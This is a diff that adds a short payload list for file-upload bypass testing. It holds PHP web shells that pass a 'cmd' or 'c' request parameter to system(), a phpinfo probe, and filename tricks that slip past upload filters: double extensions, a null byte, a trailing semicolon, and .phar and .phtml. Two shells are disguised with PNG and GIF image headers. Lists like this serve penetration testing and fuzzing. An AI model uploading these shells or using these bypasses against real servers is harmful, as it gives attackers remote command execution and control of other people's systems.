@@ -1,0 +1,10 @@
+<?php system($_GET['cmd']); ?>
+<?php phpinfo(); ?>
+shell.php.png
+shell.php.jpg
+shell.php%00.png
+shell.php;
+shell.phar
+shell.phtml
+PNG...<?php system($_GET['c']);?>
+GIF89a; <?php system($_GET['c']);?>
